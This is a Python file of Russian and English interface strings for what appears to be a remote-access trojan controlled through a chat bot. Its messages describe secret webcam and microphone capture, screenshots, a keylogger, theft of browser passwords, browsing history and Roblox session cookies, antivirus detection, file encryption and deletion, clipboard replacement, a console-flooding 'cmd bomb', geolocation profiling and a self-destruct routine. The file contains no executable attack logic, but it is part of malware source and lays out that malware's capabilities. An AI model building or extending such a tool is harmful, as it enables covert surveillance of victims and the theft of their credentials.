# Languages
user_languages = {}


TEXTS = {
    'ru': {
        'ask_duration': "Укажите длительность записи в секундах",
        'invalid': "Пожалуйста, укажите правильную длительность в секундах",
        'no_access': "К сожалению, у вас нет доступа к этому боту.",
        "access_denied": "К сожалению, у вас нет доступа к этому боту.",
        "recording_started": "Начало записи...",
        "recording_finished": "Запись завершена.",
        "audio_ready": "Вот запись аудио, root!",
        "file_send_error": "Ошибка при отправке файла:",
        "screenshot_start": "Сейчас будет, root",
        "screenshot_error": "Ошибка при отправке скриншота: {error}",

        "enter_mp3_path": "Введите полный путь к MP3-файлу (например: `/home/user/music/mysound.mp3`):",
        "invalid_mp3": "Файл не существует или это не MP3. Попробуйте снова через команду.",
        "playing_sound": "Звук воспроизводится, root!",
        "play_error": "Ошибка при воспроизведении файла: {error}",

        "no_access": "К сожалению, у вас нет доступа к этому боту.",
        "snapshot_start": "Сейчас будет, root",
        "camera_open_error": "Не удалось открыть камеру, возможно она занята другим процессом.",
        "snapshot_error": "Не удалось сделать снимок, возможно камера занята другим процессом.",
        "snapshot_sent": "Вот ваше фото с веб-камеры, root",
        "snapshot_exception": "Произошла ошибка при попытке сделать фото: {error}",

        "ask_webcam_duration": "Укажите длительность записи в секундах, root",
        "invalid_duration": "Пожалуйста, укажите правильную длительность в секундах.",
        "recording_started": "Запись началась, root",
        "camera_busy": "Камера занята другим процессом.",
        "video_ready": "Вот запись с вебки!",
        "video_error": "Ошибка при записи видео:",
        "file_delete_error": "Не удалось удалить файл",

        "no_autofill_data": "Автозаполнения не найдены.",

        "access_denied": "К сожалению, у вас нет доступа к этому боту.",
        "chrome_history_start": "Получение истории Chrome. Пожалуйста, подождите...",
        "chrome_history_not_found": "Файл истории Chrome не найден. Возможно, браузер Chrome не установлен.",
        "invalid_time": "Некорректное время",
        "error_time": "Ошибка",
        "chrome_history_filename": "История_Хрома.txt",
        "chrome_history_caption": "Вот ваш файл, root!",
        "chrome_history_send_error": "Ошибка при отправке файла",

        "access_denied": "К сожалению, у вас нет доступа к этому боту.",
        "opera_history_start": "Получение истории Opera. Пожалуйста, подождите...",
        "opera_history_not_found": "Файл истории Opera не найден. Возможно, браузер Opera не установлен.",
        "invalid_time": "Некорректное время",
        "error_time": "Ошибка",
        "opera_history_filename": "История_Оперы.txt",
        "opera_history_caption": "Вот ваш файл!",
        "opera_history_send_error": "Ошибка при отправке файла",

        "browser_passwords_start": "Получение паролей браузеров. Пожалуйста, подождите...",
        "browser_passwords_nothing_found": "Ничего не найдено.",
        "browser_passwords_file_caption": "Список паролей браузеров",
        "browser_passwords_file_name": "browser_passwords.txt",
        "firefox_password_note": "Пароли зашифрованы, требуется дополнительное расшифрование.",

        "robloxcookie_start": "Ищу ROBLOSECURITY куки...",
        "robloxcookie_not_found": "Не удалось найти ROBLOSECURITY куки.",

        "antivirus_warning": "При сканировании возможна детекция антивирусами, используйте на свой страх и риск.",
        "antivirus_found": "Установленные антивирусные программы: ",
        "antivirus_not_found": "Антивирусные программы не обнаружены.",
        "antivirus_done": "Проверка завершена, root.",
        "antivirus_cancelled": "Отменено пользователем.",
        "antivirus_cancel_msg": "Проверка антивирусов отменена.",
        "antivirus_error": "Произошла ошибка при проверке антивирусов: {error}",

        "ask_enc_path": "Укажите путь и расширение файла и в конце укажите '.enc', пример:\n C:/Users/Public/Название_файла.txt.enc",
        "file_not_found": "Файл {path} не был найден. \nПожалуйста, проверьте правильность пути и имени файла, затем повторите попытку.",
        "decryption_success": "Файл {enc} успешно расшифрован как {dec}",
        "decryption_error": "Произошла ошибка при расшифровке файла {path}. Процесс прекращён.",
        "rename_error_not_found": "Файл {path} не найден",
        "rename_error_permission": "Нет прав на изменение имени файла {path}",
        "rename_error_general": "Произошла ошибка: {error}",
        "general_error": "Произошла ошибка. Попробуйте снова.",

        'ask_encrypt_path': "Укажите путь и расширение файла, пример:\n C:/Users/Public/Название_файла.txt",
        'encrypt_success': "Файл {path} успешно зашифрован и сохранён как {enc_path}",
        'encrypt_success_with_delete_error': "Файл {path} успешно зашифрован, но произошла ошибка при удалении исходного файла.",
        'encrypt_error': "Произошла ошибка при шифровании файла {path}. Процесс прекращён.",
        'file_not_found': "Файл {path} не был найден. \nПожалуйста, проверьте правильность пути и имени файла, затем повторите попытку.",
        'general_error': "Произошла ошибка. Попробуйте снова.",
        
        'ask_delete_path': "Укажите путь и расширение файла, который хотите удалить, пример:\n C:/Users/Public/Название_файла.txt",
        'file_deleted': "Файл '{path}' успешно удалён.",
        'delete_error': "Произошла ошибка при удалении файла '{path}'.",

        'ask_download_path': "Укажите путь и расширение файла, пример:\n C:/Users/Public/Название_файла.txt",
        'file_too_large': "Файл слишком большой ({size:.2f} MB). Максимальный размер файла - 50 MB.",
        'send_file_error': "Произошла ошибка при отправке файла: {error}",

        'ask_upload_path': "Укажите путь, куда необходимо загрузить файл, пример:\n C:/Users/Public",
        'upload_invalid_path': "Неверный путь. Убедитесь, что папка существует.",
        'upload_invalid_path_final': "Не удалось найти директорию. Повторите попытку, перезапустив процесс.",
        'upload_ready': "Отправьте файл, который будет сохранён по этому пути:\n{path}",
        'upload_missing_path': "Сначала укажите корректный путь для сохранения файла.\nПопробуйте снова, перезапустив команду.",
        'upload_no_supported_file': "В сообщении нет поддерживаемого файла.",
        'upload_saving': "Принял, сохраняю...",
        'upload_success': "Файл '{name}' успешно сохранён в:\n{path}",
        'upload_error': "Ошибка при сохранении файла: {error}",

        'altf4_success': "Окно было успешно закрыто.",
        'no_access': "К сожалению, у вас нет доступа к этому боту.",

        'minimize_windows_success': "Окна были успешно свёрнуты",
        'no_access': "К сожалению, у вас нет доступа к этому боту.",

        'create_folder_prompt': "Укажите путь где создать папку и вконце название папки, пример:\n C:/Users/Public/Название_папки",
        'folder_created': "Папка '{folder_name}' успешно создана!",
        'folder_exists': "Папка с именем '{folder_name}' уже существует!",
        'folder_invalid_path': "Пожалуйста, укажите полный путь к папке, а не только её название.",
        'try_again': "Попробуйте снова. Перезапустив процесс.",
        'no_access': "К сожалению, у вас нет доступа к этому боту.",

        'delete_folder_prompt': "Укажите путь и вконце название папки, пример:\n C:/Users/Public/Название_папки\n!!!Папка удаляется со всем содержимым!!!",
        'folder_deleted': "Папка '{folder_name}' и все её содержимое успешно удалены.",
        'folder_not_found': "Папка '{folder_name}' не найдена. Пожалуйста, введите корректный путь к папке",
        'try_again': "Попробуйте снова. Перезапустив процесс.",
        'folder_delete_error': "Ошибка при удалении папки: {error}",
        'no_access': "К сожалению, у вас нет доступа к этому боту.",

        'move_file_prompt_source': "Хорошо, введите путь файла, который хотите переместить (например, C:/Users/Public/Название_файла.txt):",
        'move_file_prompt_dest': "Теперь введите путь, куда нужно переместить файл (например, C:/Users/Public/Целевая_папка/):",
        'move_file_success': "Файл успешно перемещён в {destination_path}.",
        'move_file_not_found': "Файл не найден. Пожалуйста, убедитесь, что путь к файлу указан правильно и перезапустите процесс.",
        'move_dir_not_found': "Целевая директория не найдена. Пожалуйста, убедитесь, что путь к директории указан правильно и перезапустите процесс.",
        'move_file_no_permission': "Недостаточно прав для перемещения файла. Пожалуйста, проверьте права доступа.",
        'move_file_os_error': "Ошибка доступа к файлу или директории: {error}",
        'move_file_unknown_error': "Произошла непредвиденная ошибка: {error}",
        'no_access': "К сожалению, у вас нет доступа к этому боту.",

        'open_file_prompt': "Укажите путь и имя файла с его расширением, пример:\n C:/Users/Public/Название_файла.txt",
        'open_file_success': "Файл был успешно открыт.",
        'open_file_not_found': "Файл {file_path} не был найден. \nПожалуйста, проверьте правильность пути и имени файла, затем повторите попытку.",
        'open_file_error': "Произошла ошибка при открытии файла: {error}",
        'no_access': "К сожалению, у вас нет доступа к этому боту.",

        'keylogger_started': "Кейлоггер запущен, root",
        'keylogger_already_running': "Кейлоггер уже работает, root",
        'no_access': "К сожалению, у вас нет доступа к этому боту.",

        'keylogs_sending': "Отправляю логи, root",
        'keylogs_missing': "Файл логов пока отсутствует, root",
        'no_access': "К сожалению, у вас нет доступа к этому боту.",

        'clipboard_view': "Содержимое буфера обмена:\n{content}",
        'clipboard_edit_prompt': "Хорошо, отправь мне текст, на который хочешь заменить буфер обмена",
        'clipboard_edit_success': "Текст успешно помещен в буфер обмена!",
        'no_access': "К сожалению, у вас нет доступа к этому боту.",

        'clipboard_content': "Содержимое буфера обмена",
        'clipboard_ask_new': "Хорошо, отправь мне текст, на который хочешь заменить буфер обмена",
        'clipboard_success': "Текст успешно помещен в буфер обмена!",

        'task_manager_closed': "Диспетчер задач закрыт.",
        'task_manager_not_running': "Диспетчер задач не запущен.",
        'folder_empty': "Папка пуста",
        'error': "Ошибка",
        'directory_content': "Содержание директории",

        'enter_new_directory': "Введите путь к новой директории:",
        'directory_changed': "Успешно переместился, вот текущая директория",
        'invalid_directory': "Неверный путь. Попробуйте снова.",

        'enter_url': "Ок, кидай ссылку.",
        'url_opened': "Ссылка была успешно открыта:",

        'send_photo': "Хорошо, отправьте фото.",
        'wallpaper_changed': "Обои успешно заменены.",
        'file_not_found': "Ошибка: файл не найден.",
        'error_occurred': "Произошла ошибка: {error}",

        'cmd_bomb_warning': "Осторожно \nЕсли запустить эту команду бесконечно, поможет только перезагрузка ПК.\nВведи сколько раз хочешь открыть консоль: \nЕсли хочешь бесконечно, то введи 404",
        'cmd_bomb_negative': "Количество должно быть неотрицательным. Пожалуйста, попробуйте снова.",
        'cmd_bomb_invalid': "Пожалуйста, введите корректное число.",
        'cmd_bomb_opened': "Консоли открыты.",

        'pc_data_start': "Начинаем сбор данных о ПК. Это может занять некоторое время.",
        'pc_data_cpu': "Собираем данные о процессоре...",
        'pc_data_cpu_done': "Информация о процессоре получена.",
        'pc_data_cpu_error': "Ошибка при сборе данных о процессоре: {error}",
        'pc_data_gpu': "Собираем информацию о видеокарте...",
        'pc_data_gpu_done': "Информация о видеокарте собрана.",
        'pc_data_gpu_not_found': "Видеокарта не обнаружена",
        'pc_data_gpu_error': "Ошибка при сборе данных о видеокарте: {error}",
        'pc_data_system': "Собираем системную информацию...",
        'pc_data_system_done': "Системная информация собрана.",
        'pc_data_network': "Собираем данные о сети (IP-адрес и геолокация)...",
        'pc_data_network_done': "Данные о сети собраны.",
        'pc_data_local': "Получаем локальный IP и имя компьютера...",
        'pc_data_local_done': "Локальный IP и имя компьютера получены.",
        'pc_data_ip_timeout': "Превышено время ожидания для IP",
        'pc_data_ip_error': "Ошибка при получении IP: {error}",
        'pc_data_report_sending': "Формируем и отправляем отчет...",
        'pc_data_report': (
            "Архитектура процессора: {cpu_arch}\n"
            "Количество ядер процессора: {cpu_cores}\n"
            "Логическое количество ядер: {logical_cores}\n"
            "Видеокарта: {gpu_info}\n"
            "Общая память ОЗУ: {ram:.2f} GB\n"
            "Система: {system}\n"
            "Имя пользователя: {user}\n"
            "Имя ПК: {hostname}\n"
            "Публичный IP-адрес: {public_ip}\n"
            "Локальный IP-адрес: {local_ip}\n"
            "Данные локации и IP: {ip_info}"
        ),

        'shutdown_start': "ОК, выключаю ПК.",

        'reboot_start': "ОК, перезагружаю ПК.",

        "self_confirm_prompt": f"Вы уверены что хотите это сделать? \nДля подтверждения отправьте эту комбинацию: {{password}}",
        "self_success": "Было приятно с вами поработать, root. Выполняю протокол 'самоуничтожение'.",
        "self_wrong_code": "Комбинация была введена неверно. Продолжаю работать дальше с вами, Сэр.",
        "self_no_access": "К сожалению, у вас нет доступа к этому боту.",

        "no_access": "К сожалению, у вас нет доступа к этому боту.",
        "network_start": "Собираем данные, это может занять некоторое время...",
        "ping_error": "Ошибка пинга",
        "traceroute_error": "Ошибка трассировки маршрута",
        "port_scan_error": "Ошибка сканирования портов",
        "net_info_error": "Ошибка получения информации о сети",
        "dns_result": "IP-адрес для",
        "dns_error": "Ошибка разрешения DNS",
        "website_status": "Статус сайта",
        "website_error": "Ошибка доступа к сайту",
        "external_ip": "Внешний IP-адрес",
        "external_ip_error": "Ошибка получения внешнего IP",
        "traffic_received": "Принято данных",
        "traffic_sent": "Отправлено данных",
        "traffic_error": "Ошибка получения информации о трафике",
        "mtu": "MTU для интерфейса",
        "mtu_error": "Ошибка получения MTU",
        "network_report": "Отчет о сети",
        "ping_results": "Результаты пинга",
        "traceroute_results": "Результаты трассировки маршрута",
        "port_scan_results": "Результаты сканирования портов",
        "open_ports": "Открытые порты",
        "network_info": "Информация о сети",
        "additional_info": "Дополнительная информация",
        "report_error": "Ошибка при создании отчета",

        "no_access": "К сожалению, у вас нет доступа к этому боту.",
        "process_report_title": "Отчет о процессах:",

        "no_access": "К сожалению, у вас нет доступа к этому боту.",
        "short_process_report_title": "Список процессов:",

        "no_access": "К сожалению, у вас нет доступа к этому боту.",
        "enter_pid": "Укажите PID процесса.",
        "invalid_pid": "{pid} - не является PID.",
        "process_terminated": "Процесс с PID {pid} успешно завершен.",
        "process_not_found": "Процесс с PID {pid} не найден.",
        "access_denied": "Недостаточно прав для завершения процесса с PID {pid}.",
        "terminate_timeout": "Процесс с PID {pid} не завершился за отведенное время. Принудительное завершение.",
        "process_killed": "Процесс с PID {pid} принудительно завершен.",
        'volume_unmuted': "Звук включен.",
        'volune muted': "Звук отключен.",
        'volume_set_100': "Громкость была установлена на 100%"
        
        
    },
    'en': {
        'ask_duration': "Enter recording duration in seconds",
        'invalid': "Please enter a valid duration in seconds",
        'no_access': "You do not have access to this bot.",
        "access_denied": "You do not have access to this bot.",
        "recording_started": "Recording started...",
        "recording_finished": "Recording finished.",
        "audio_ready": "Here is the audio recording, root!",
        "file_send_error": "Error sending file:",
        "screenshot_start": "Taking screenshot now, root...",
        "screenshot_error": "Error sending screenshot: {error}",

        "enter_mp3_path": "Enter the full path to the MP3 file (e.g., `/home/user/music/mysound.mp3`):",
        "invalid_mp3": "The file does not exist or is not an MP3. Try again with the command.",
        "playing_sound": "The sound is playing, root!",
        "play_error": "Error playing the file: {error}",

        "no_access": "You do not have access to this bot.",
        "snapshot_start": "One moment, root.",
        "camera_open_error": "Could not open the camera, it might be used by another process.",
        "snapshot_error": "Could not take a snapshot, the camera might be busy.",
        "snapshot_sent": "Here’s your webcam photo, root!",
        "snapshot_exception": "An error occurred while taking the photo: {error}",

        "ask_webcam_duration": "Specify the recording duration in seconds, root",
        "invalid_duration": "Please enter a valid duration in seconds.",
        "recording_started": "Recording started, root",
        "camera_busy": "The camera is busy with another process.",
        "video_ready": "Here is the webcam recording!",
        "video_error": "Error recording video:",
        "file_delete_error": "Failed to delete file",

        "no_autofill_data": "No autofill data found.",

        "access_denied": "Access denied.",
        "chrome_history_start": "Getting Chrome history. Please wait...",
        "chrome_history_not_found": "Chrome history file not found. Is Chrome installed?",
        "invalid_time": "Invalid time",
        "error_time": "Error",
        "chrome_history_filename": "Chrome_History.txt",
        "chrome_history_caption": "Here is your Chrome history, root!",
        "chrome_history_send_error": "Error sending file",

        "access_denied": "Access denied.",
        "opera_history_start": "Getting Opera history. Please wait...",
        "opera_history_not_found": "Opera history file not found. Is Opera installed?",
        "invalid_time": "Invalid time",
        "error_time": "Error",
        "opera_history_filename": "Opera_History.txt",
        "opera_history_caption": "Here is your Opera history, root!",
        "opera_history_send_error": "Error sending file",

        "browser_passwords_start": "Getting browser passwords. Please wait...",
        "browser_passwords_nothing_found": "Nothing found.",
        "browser_passwords_file_caption": "Browser passwords list",
        "browser_passwords_file_name": "browser_passwords.txt",
        "firefox_password_note": "Passwords are encrypted, additional decryption required.",

        "robloxcookie_start": "Searching for ROBLOSECURITY cookie...",
        "robloxcookie_not_found": "Could not find ROBLOSECURITY cookie.",

        "antivirus_warning": "Antivirus scan may trigger detections, use at your own risk.",
        "antivirus_found": "Installed antivirus products: ",
        "antivirus_not_found": "No antivirus products detected.",
        "antivirus_done": "Scan completed, root.",
        "antivirus_cancelled": "Cancelled by user.",
        "antivirus_cancel_msg": "Antivirus scan cancelled.",
        "antivirus_error": "An error occurred during antivirus scan: {error}",

        "ask_enc_path": "Specify the full path to the file including the '.enc' extension, e.g.:\n C:/Users/Public/File_name.txt.enc",
        "file_not_found": "The file {path} was not found.\nPlease check the path and file name and try again.",
        "decryption_success": "The file {enc} was successfully decrypted as {dec}",
        "decryption_error": "An error occurred while decrypting the file {path}. Process aborted.",
        "rename_error_not_found": "File {path} not found",
        "rename_error_permission": "No permission to rename file {path}",
        "rename_error_general": "An error occurred: {error}",
        "general_error": "An error occurred. Please try again.",

        'ask_encrypt_path': "Enter the file path and extension, e.g.,\n C:/Users/Public/File_Name.txt",
        'encrypt_success': "File {path} encrypted successfully and saved as {enc_path}",
        'encrypt_success_with_delete_error': "File {path} was encrypted, but an error occurred while deleting the original file.",
        'encrypt_error': "An error occurred while encrypting file {path}. Process aborted.",
        'file_not_found': "File {path} was not found. \nPlease check the file path and name, then try again.",
        'general_error': "An error occurred. Please try again.",

        'ask_delete_path': "Enter the full path and extension of the file you want to delete, e.g.,\n C:/Users/Public/File_Name.txt",
        'file_deleted': "File '{path}' has been successfully deleted.",
        'delete_error': "An error occurred while deleting the file '{path}'.",

        'ask_download_path': "Enter the full path and extension of the file, e.g.,\n C:/Users/Public/File_Name.txt",
        'file_too_large': "The file is too large ({size:.2f} MB). The maximum file size is 50 MB.",
        'send_file_error': "An error occurred while sending the file: {error}",

        'ask_upload_path': "Enter the path where the file should be saved, e.g.,\n C:/Users/Public",
        'upload_invalid_path': "Invalid path. Make sure the directory exists.",
        'upload_invalid_path_final': "Failed to find the directory. Please restart the process and try again.",
        'upload_ready': "Send the file that will be saved to:\n{path}",
        'upload_missing_path': "You must first specify a valid path to save the file. Please restart the command.",
        'upload_no_supported_file': "No supported file found in the message.",
        'upload_saving': "Received. Saving...",
        'upload_success': "File '{name}' successfully saved to:\n{path}",
        'upload_error': "Error while saving the file: {error}",

        'altf4_success': "Window was closed successfully.",
        'no_access': "Unfortunately, you don't have access to this bot.",

        'minimize_windows_success': "Windows were successfully minimized",
        'no_access': "Unfortunately, you don't have access to this bot.",

        'create_folder_prompt': "Specify the path where to create the folder, including the folder name, example:\n C:/Users/Public/Folder_Name",
        'folder_created': "Folder '{folder_name}' has been successfully created!",
        'folder_exists': "A folder named '{folder_name}' already exists!",
        'folder_invalid_path': "Please provide the full path to the folder, not just its name.",
        'try_again': "Try again by restarting the process.",
        'no_access': "Unfortunately, you don't have access to this bot.",

        'delete_folder_prompt': "Specify the full path and folder name to delete, example:\n C:/Users/Public/Folder_Name\n!!!The folder will be deleted with all its contents!!!",
        'folder_deleted': "Folder '{folder_name}' and all its contents have been successfully deleted.",
        'folder_not_found': "Folder '{folder_name}' not found. Please enter a correct folder path",
        'try_again': "Try again by restarting the process.",
        'folder_delete_error': "Error deleting folder: {error}",
        'no_access': "Unfortunately, you don't have access to this bot.",

        'move_file_prompt_source': "Please enter the path of the file you want to move (e.g., C:/Users/Public/File_Name.txt):",
        'move_file_prompt_dest': "Now enter the path to move the file to (e.g., C:/Users/Public/Target_Folder/):",
        'move_file_success': "File successfully moved to {destination_path}.",
        'move_file_not_found': "File not found. Please make sure the file path is correct and restart the process.",
        'move_dir_not_found': "Target directory not found. Please make sure the directory path is correct and restart the process.",
        'move_file_no_permission': "Insufficient permissions to move the file. Please check your access rights.",
        'move_file_os_error': "File or directory access error: {error}",
        'move_file_unknown_error': "An unexpected error occurred: {error}",
        'no_access': "You do not have access to this bot.",

        'open_file_prompt': "Enter the full path and name of the file, e.g., C:/Users/Public/File_Name.txt",
        'open_file_success': "File was successfully opened.",
        'open_file_not_found': "File {file_path} was not found. \nPlease check the path and file name, then try again.",
        'open_file_error': "An error occurred while opening the file: {error}",
        'no_access': "You do not have access to this bot.",

        'keylogger_started': "Keylogger started, root",
        'keylogger_already_running': "Keylogger is already running, root",
        'no_access': "You do not have access to this bot.",

        'keylogs_sending': "Sending logs, root",
        'keylogs_missing': "Log file is not available yet, root",
        'no_access': "You do not have access to this bot.",

        'clipboard_view': "Clipboard content:\n{content}",
        'clipboard_edit_prompt': "Send me the text you want to set in the clipboard",
        'clipboard_edit_success': "Text successfully copied to clipboard!",
        'no_access': "You do not have access to this bot.",

        'clipboard_content': "Clipboard content",
        'clipboard_ask_new': "Okay, send me the text to replace the clipboard content",
        'clipboard_success': "Text has been successfully copied to the clipboard!",

        'task_manager_closed': "Task Manager has been closed.",
        'task_manager_not_running': "Task Manager is not running.",

        'folder_empty': "Folder is empty",
        'error': "Error",
        'directory_content': "Directory content",

        'enter_new_directory': "Enter the path to the new directory:",
        'directory_changed': "Successfully changed directory, current directory is",
        'invalid_directory': "Invalid path. Please try again.",

        'enter_url': "Ok, send me the URL.",
        'url_opened': "The URL was successfully opened:",

        'send_photo': "Ok, send me a photo.",
        'wallpaper_changed': "Wallpaper successfully changed.",
        'file_not_found': "Error: file not found.",
        'error_occurred': "An error occurred: {error}",

        'cmd_bomb_warning': "Warning\nIf you run this command infinitely, only a PC restart will help.\nEnter how many times you want to open the console:\nIf you want infinite, enter 404",
        'cmd_bomb_negative': "Number must be non-negative. Please try again.",
        'cmd_bomb_invalid': "Please enter a valid number.",
        'cmd_bomb_opened': "Consoles opened.",

        'pc_data_start': "Starting PC data collection. This may take some time.",
        'pc_data_cpu': "Collecting CPU data...",
        'pc_data_cpu_done': "CPU information collected.",
        'pc_data_cpu_error': "Error collecting CPU data: {error}",
        'pc_data_gpu': "Collecting GPU information...",
        'pc_data_gpu_done': "GPU information collected.",
        'pc_data_gpu_not_found': "GPU not detected",
        'pc_data_gpu_error': "Error collecting GPU data: {error}",
        'pc_data_system': "Collecting system information...",
        'pc_data_system_done': "System information collected.",
        'pc_data_network': "Collecting network data (IP address and geolocation)...",
        'pc_data_network_done': "Network data collected.",
        'pc_data_local': "Getting local IP and computer name...",
        'pc_data_local_done': "Local IP and computer name collected.",
        'pc_data_ip_timeout': "IP address request timed out",
        'pc_data_ip_error': "Error fetching IP: {error}",
        'pc_data_report_sending': "Preparing and sending report...",
        'pc_data_report': (
            "CPU Architecture: {cpu_arch}\n"
            "CPU Cores: {cpu_cores}\n"
            "Logical Cores: {logical_cores}\n"
            "GPU: {gpu_info}\n"
            "Total RAM: {ram:.2f} GB\n"
            "System: {system}\n"
            "User: {user}\n"
            "PC Name: {hostname}\n"
            "Public IP: {public_ip}\n"
            "Local IP: {local_ip}\n"
            "Location/IP info: {ip_info}"
        ),

        'shutdown_start': "OK, shutting down the PC.",

        'reboot_start': "OK, rebooting the PC.",

        "confirm_prompt": f"Are you sure you want to do this? \nTo confirm, send this code: {{password}}",
        "success": "It was a pleasure working with you, root. Executing self-destruction protocol.",
        "wrong_code": "The code was entered incorrectly. Continuing to work with you, Sir.",
        "no_access": "Unfortunately, you do not have access to this bot.",

        "self_confirm_prompt": f"Are you sure you want to do this? \nTo confirm, send this code: {{password}}",
        "self_success": "It was a pleasure working with you, root. Executing self-destruction protocol.",
        "self_wrong_code": "The code was entered incorrectly. Continuing to work with you, Sir.",
        "self_no_access": "Unfortunately, you do not have access to this bot.",

        "no_access": "Unfortunately, you do not have access to this bot.",
        "network_start": "Collecting network data, this may take a while...",
        "ping_error": "Ping error",
        "traceroute_error": "Traceroute error",
        "port_scan_error": "Port scan error",
        "net_info_error": "Error getting network info",
        "dns_result": "IP address for",
        "dns_error": "DNS resolution error",
        "website_status": "Website status",
        "website_error": "Website access error",
        "external_ip": "External IP address",
        "external_ip_error": "Error getting external IP",
        "traffic_received": "Data received",
        "traffic_sent": "Data sent",
        "traffic_error": "Error getting traffic info",
        "mtu": "MTU for interface",
        "mtu_error": "Error getting MTU",
        "network_report": "Network report",
        "ping_results": "Ping results",
        "traceroute_results": "Traceroute results",
        "port_scan_results": "Port scan results",
        "open_ports": "Open ports",
        "network_info": "Network information",
        "additional_info": "Additional information",
        "report_error": "Error generating report",

        "no_access": "Unfortunately, you do not have access to this bot.",
        "process_report_title": "Process report:",

        "no_access": "Unfortunately, you do not have access to this bot.",
        "short_process_report_title": "List of processes:",

        "no_access": "Unfortunately, you do not have access to this bot.",
        "enter_pid": "Please enter the PID of the process.",
        "invalid_pid": "{pid} is not a valid PID.",
        "process_terminated": "Process with PID {pid} has been terminated.",
        "process_not_found": "Process with PID {pid} was not found.",
        "access_denied": "Access denied to terminate process with PID {pid}.",
        "terminate_timeout": "Process with PID {pid} did not terminate in time. Forcing termination.",
        "process_killed": "Process with PID {pid} was forcefully terminated.",
        'volume_unmuted': "Sound is unmuted.",
        'volune muted': "Sound is muted.",
        'volume_set_100': "Volume has been set to 100%"
    }
}